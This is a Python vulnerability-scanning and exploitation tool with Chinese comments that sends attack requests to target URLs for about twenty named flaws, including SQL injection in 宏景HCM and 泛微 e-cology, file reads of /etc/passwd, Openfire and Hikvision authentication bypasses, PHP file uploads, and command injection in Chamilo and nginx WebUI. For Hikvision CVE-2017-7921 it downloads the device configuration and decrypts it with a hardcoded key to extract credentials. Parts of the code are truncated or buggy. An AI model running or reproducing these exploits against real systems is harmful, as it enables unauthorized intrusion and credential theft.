import base64
import hashlib
import json
import os
import re
import socket
import ssl
import time
import urllib
import xml.etree.ElementTree as ElementTree
from itertools import cycle
from urllib.parse import urljoin

import requests
import urllib3
from Crypto.Cipher import AES
from colorama import Fore
from requests.exceptions import Timeout


def xlpoc_detection(vulnerability, url, proxies, append_to_output):
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "*/*",
        "Connection": "close",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip,deflate"
    }
    if vulnerability == "提取至xiaolongPOC，不一定可用":
        append_to_output(f"[!] 您选取的: {url}", "yellow")
    if vulnerability == "1.宏景HCM categories SQL注入(CNVD-2023-08743)":
        if url.endswith("/"):
            path = "servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"
        else:
            path = "/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'hellohongjingHcm' in res:
                append_to_output(f"[+] {url} 存在宏景HCM categories SQL注入！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在宏景HCM categories SQL注入！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在宏景HCM categories SQL注入", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "2.蓝凌OA存在任意文件读取漏洞(CNVD-2021-28277)":
        if url.endswith("/"):
            path = "sys/ui/extend/varkind/custom.jsp"
        else:
            path = "/sys/ui/extend/varkind/custom.jsp"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'root' in res:
                append_to_output(f"[+] {url} 存在蓝凌OA任意文件读取漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在蓝凌OA任意文件读取漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "3.motionEye应用程序信息泄露漏洞(CVE-2022-25568)":
        if url.endswith("/"):
            path = "config/list"
        else:
            path = "/config/list"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'root' in res:
                append_to_output(f"[+] {url} 存在motionEye应用程序 config/list 信息泄露漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在motionEye应用程序 config/list 信息泄露漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "4.泛微e8任意用户登录漏洞":
        if url.endswith("/"):
            path = "mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp"
        else:
            path = "/mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'location.replace' not in res and '建议设置为' not in res:
                append_to_output(f"[+] {url} 存在泛微e-cology ofsLogin.jsp任意用户登录漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在泛微e-cology ofsLogin.jsp任意用户登录漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "5.泛微e-cology9 SQL注入漏洞(QVD-2023-5012)":
        if url.endswith("/"):
            path = "mobile/%20/plugin/browser.jsp"
        else:
            path = "/mobile/%20/plugin/browser.jsp"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        payload = {
            "isDis": "1",
            "browserTypeId": "269",
            "keyword
        }

        try:
            req = requests.post(encodetext, data=payload, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and 'autoCount' in res:
                append_to_output(f"[+] {url} 存在泛微e-cology9 SQL注入漏洞！！！！", "red")

                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在泛微e-cology9 SQL注入漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在泛微e-cology9 SQL注入漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "6.畅捷通CRM SQL注入漏洞":  # 待开发
        if url.endswith("/"):
            path = "WebSer~1/create_site.php?site_id=1+AND+%28SELECT+6663+FROM+%28SELECT%28SLEEP%285%29%29%29Jdzn%29"
        else:
            path = "/WebSer~1/create_site.php?site_id=1+AND+%28SELECT+6663+FROM+%28SELECT%28SLEEP%285%29%29%29Jdzn%29"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在畅捷通CRM SQL注入漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在畅捷通CRM SQL注入漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "7.畅捷通T+ SQL注入漏洞(QVD-2023-13612)":

        if url.endswith("/"):
            path = "tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex"
        else:
            path = "/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        data = {
            "accNum": "3'",
            "functionTag": "SYS0104",
            "url": ""
        }
        try:
            req = requests.post(encodetext, headers=headers, json=data, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'value' in res:
                append_to_output(f"[+] {url} 存在畅捷通T+ SQL注入漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在畅捷通T+ SQL注入漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "8.GeoServer SQL注入漏洞(CVE-2023-25157)":  # 待开发
        if url.endswith("/"):
            path = "geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities"
        else:
            path = "/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在GeoServer SQL注入漏洞(CVE-2023-25157)！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在GeoServer SQL注入漏洞(CVE-2023-25157)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "9.Smartbi内置用户登陆绕过漏洞":
        if url.endswith("/"):
            path = "smartbi/vision/RMIServlet"
        else:
            path = "/smartbi/vision/RMIServlet"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'retCode' in req:
                append_to_output(f"[+] {url} 存在Smartbi内置用户登陆绕过漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在Smartbi内置用户登陆绕过漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "10.金蝶云星空RCE漏洞":
        if url.endswith("/"):
            path = "Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc"
        else:
            path = "/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        data = {
            "ap0": "asdas",
            "format": "3"
        }

        try:
            req = requests.post(encodetext, data=json.dumps(data), headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and 'response' in res:
                append_to_output(f"[+] {url} 存在金蝶云星空RCE漏洞！！！！", "red")

                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在金蝶云星空RCE漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在金蝶云星空RCE漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "11.Openfire身份认证绕过漏洞(CVE-2023-32315)":
        if url.endswith("/"):
            path = "setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"
        else:
            path = "/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'INFO' in req:
                append_to_output(f"[+] {url} 存在Openfire身份认证绕过漏洞(CVE-2023-32315)！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在Openfire身份认证绕过漏洞(CVE-2023-32315)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "12.HIKVISION-海康威视iVMS综合安防系统任意文件上传漏洞":
        if url.endswith("/"):
            path = "eps/api/resourceOperations/uploadsecretKeyIbuilding"
        else:
            path = "/eps/api/resourceOperations/uploadsecretKeyIbuilding"
        encodetext = url + path
        md5hash = hashlib.md5().update(encodetext.encode("utf-8"))
        if url.endswith("/"):
            path = "eps/api/resourceOperations/upload?token="
        else:
            path = "/eps/api/resourceOperations/upload?token="
        pocurl = url + path + str(md5hash)
        data = {
            "service": urllib.parse.quote(url + "/home/index.action")
        }
        try:
            response = requests.post(url=pocurl, headers=headers, data=data, verify=False, timeout=3)
            if response.status_code == 200:
                append_to_output(Fore.GREEN + f"[+]{url}存在海康威视iVMS 综合安防任意文件上传漏洞！！！！", "red")
            else:
                append_to_output(Fore.RED + f"[-]{url}不存在海康威视iVMS 综合安防任意文件上传漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "13.泛微 E-Office文件上传漏洞复现(CVE-2023-2523)":
        if url.endswith("/"):
            path = "E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"
        else:
            path = "/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"
        }
        data = '''
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Content-Disposition: form-data; name="upload_quwan"; filename="1.php."
        Content-Type: image/jpeg

        <?php phpinfo();?>
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Content-Disposition: form-data; name="file"; filename=""
        Content-Type: application/octet-stream


        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
        '''

        try:
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在泛微 E-Office文件上传漏洞复现(CVE-2023-2523)！！！！", "red")

                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在泛微 E-Office文件上传漏洞复现(CVE-2023-2523)！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在泛微 E-Office文件上传漏洞复现(CVE-2023-2523)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "14.泛微 E-Office文件上传漏洞复现(CVE-2023-2648)":
        if url.endswith("/"):
            path = "inc/jquery/uploadify/uploadify.php"
        else:
            path = "/inc/jquery/uploadify/uploadify.php"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"
        }
        data = '''
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Content-Disposition: form-data; name="Fdiledata"; filename="uploadify.php."
        Content-Type: image/jpeg

        <?php phpinfo();?>
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        '''

        try:
            req = requests.post(encodetext, data=data, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在泛微 E-Office文件上传漏洞复现(CVE-2023-2648)！！！！", "red")

                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在泛微 E-Office文件上传漏洞复现(CVE-2023-2648)！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在泛微 E-Office文件上传漏洞复现(CVE-2023-2648)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "15.HIKVISION-视频监控(CVE-2017-7921)":
        if url.endswith("/"):
            path = "Security/users?auth=YWRtaW46Mg"
        else:
            path = "/Security/users?auth=YWRtaW46Mg"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        # 补足密文为16的倍数
        def add_to_16(s):
            while len(s) % 16 != 0:
                s += b'\0'
            return s

            # AES解密，密文是下载的configurationFile文件，密钥为固定值279977f62f6cfd2d91cd75b889ce0c9a

        # 固定密钥+AES......被锤烂不意外
        # 注意那个iv 因为这里使用的是ECB模式所以根本不需要iv.....估计是赶工没写CBC,不然这开头的iv要它何用
        def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
            key = bytes.fromhex(hex_key)
            ciphertext = add_to_16(ciphertext)
            # iv = ciphertext[:AES.block_size]
            cipher = AES.new(key, AES.MODE_ECB)
            plaintext = cipher.decrypt(ciphertext[AES.block_size:])
            return plaintext.rstrip(b"\0")

        # 解密完了的明文还需要挨个异或0x73, 0x8B, 0x55, 0x44的循环才能得到最终明文
        def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
            return bytes(a ^ b for a, b in zip(data, cycle(key)))

        def strings(file):
            chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
            shortestReturnChar = 2
            regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
            pattern = re.compile(regExp)
            return pattern.findall(file)

        def crypt_script(file_path):
            # file_path = r"D:\python\allattack\configurationFile"  # 指定配置文件的绝对路径
            if not os.path.isfile(file_path):
                return append_to_output("指定的配置文件不存在。", "green")

            xor = xore(decrypt(open(file_path, 'rb').read()))
            result_list = strings(xor.decode('ISO-8859-1'))
            # append_to_output(result_list, "green")
            result_list_str = ', '.join(result_list)  # 将列表中的元素连接为一个字符串
            append_to_output(result_list_str, "green")

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'userName' in res:
                append_to_output(f"[+] {url} 存在HIKVISION-视频监控(CVE-2017-7921)！！！！", "red")
                append_to_output(res, "yellow")
                urlres = url + '/System/configurationFile?auth=YWRtaW46Mg'

                # 发起GET请求下载配置文件
                response = requests.get(urlres)

                if response.status_code == 200:
                    filename = "configurationFile"  # 配置文件名固定为"configurationFile"

                    # 保存配置文件
                    with open(filename, 'wb') as file:
                        file.write(response.content)

                    # 获取文件的绝对路径
                    file_path = os.path.abspath(filename)

                    append_to_output(f"配置文件已下载并保存为:{filename}", "green")
                    append_to_output(f"文件路径:{file_path}", "green")
                    crypt_script(file_path)
                else:
                    append_to_output(f"无法下载配置文件。状态码:{response.status_code}", "green")
            else:
                append_to_output(f"[-] {url} 不存在HIKVISION-视频监控(CVE-2017-7921)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "16.shopxo文件读取(CNVD-2021-15822)":
        if url.endswith("/"):
            path = "public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q="
        else:
            path = "/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q="

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'root' in res:
                append_to_output(f"[+] {url} 存在shopxo文件读取(CNVD-2021-15822)！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在shopxo文件读取(CNVD-2021-15822)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")

    if vulnerability == "18.Chamilo学习管理软件存在命令执行漏洞(CVE-2023-34960)":
        if url.endswith("/"):
            path = "main/webservices/additional_webservices.php"
        else:
            path = "/main/webservices/additional_webservices.php"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        payload = '''
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{http://ip:port}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
          <SOAP-ENV:Body>
            <ns1:wsConvertPpt>
              <param0 xsi:type="ns2:Map">
                <item>
                  <key xsi:type="xsd:string">file_data</key>
                  <value xsi:type="xsd:string"></value>
                </item>
                <item>
                  <key xsi:type="xsd:string">file_name</key>
                  <value xsi:type="xsd:string">`{}`.pptx'|" |cat /etc/passwd||a #</value>
                </item>
                <item>
                  <key xsi:type="xsd:string">service_ppt2lp_size</key>
                  <value xsi:type="xsd:string">720x540</value>
                </item>
              </param0>
            </ns1:wsConvertPpt>
          </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>
        '''  # Replace "filename" with the desired filename

        try:
            req = requests.post(encodetext, data=payload, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在Chamilo学习管理软件存在命令执行漏洞(CVE-2023-34960)！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在Chamilo学习管理软件存在命令执行漏洞(CVE-2023-34960)！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在Chamilo学习管理软件存在命令执行漏洞(CVE-2023-34960)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "19.华夏ERP敏感信息泄露漏洞(CNVD-2020-63964)":
        if url.endswith("/"):
            path = "jshERP-boot/user/getAllList;.ico"
        else:
            path = "/jshERP-boot/user/getAllList;.ico"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
            'Accept': '*/*',
            'Connection': 'Keep-Alive'
        }
        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在华夏ERP敏感信息泄露漏洞(CNVD-2020-63964)！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在华夏ERP敏感信息泄露漏洞(CNVD-2020-63964)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "20.Joomla存在未授权访问漏洞(CVE-2023-23752)":
        if url.endswith("/"):
            path = "api/index.php/v1/config/application?public=true"
        else:
            path = "/api/index.php/v1/config/application?public=true"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
            'Accept': '*/*',
            'Connection': 'Keep-Alive'
        }
        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'user' in res:
                append_to_output(f"[+] {url} 存在Joomla存在未授权访问漏洞(CVE-2023-23752)！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在Joomla存在未授权访问漏洞(CVE-2023-23752)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "21.nginx WebUI Cmd远程命令执行漏洞":
        if url.endswith("/"):
            path = "AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx"
        else:
            path = "/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
        }
        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'success' in res:
                append_to_output(f"[+] {url} 存在nginx WebUI Cmd远程命令执行漏洞！！！！", "red")
                append_to_output(res, "yellow")
            else:
                append_to_output(f"[-] {url} 不存在nginx WebUI Cmd远程命令执行漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "22.中新金盾信息安全管理系统默认口令":
        if url.endswith("/"):
            path = "?q=common/login"
        else:
            path = "/?q=common/login"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Content-Type": "application/x-www-form-urlencoded"
        }
